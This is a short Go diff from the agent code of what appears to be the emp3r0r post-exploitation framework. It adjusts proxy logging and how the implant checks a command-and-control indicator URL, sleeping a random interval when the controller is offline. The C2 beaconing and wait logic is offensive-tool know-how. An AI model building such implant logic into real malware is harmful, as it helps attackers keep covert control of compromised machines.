@@ -246,10 +246,18 @@ func main() {
 
 	// apply whatever proxy setting we have just added
 	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
-	log.Printf("Using proxy: %s", emp3r0r_data.AgentProxy)
+	if emp3r0r_data.AgentProxy != "" {
+		log.Printf("Using proxy: %s", emp3r0r_data.AgentProxy)
+	} else {
+		log.Println("Not using proxy")
+	}
+
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	if emp3r0r_data.IndicatorWaitMax != 0 { // if IndicatorWaitMax is 0, don't attempt
+	if emp3r0r_data.IndicatorWaitMax > 0 &&
+		emp3r0r_data.CCIndicator != "" &&
+		emp3r0r_data.CCIndicatorText != "" { // check indicator URL or not
+
 		if !agent.IsCCOnline(emp3r0r_data.AgentProxy) {
 			log.Println("CC not online")
 			time.Sleep(time.Duration(util.RandInt(emp3r0r_data.IndicatorWaitMin, emp3r0r_data.IndicatorWaitMax)) * time.Minute)
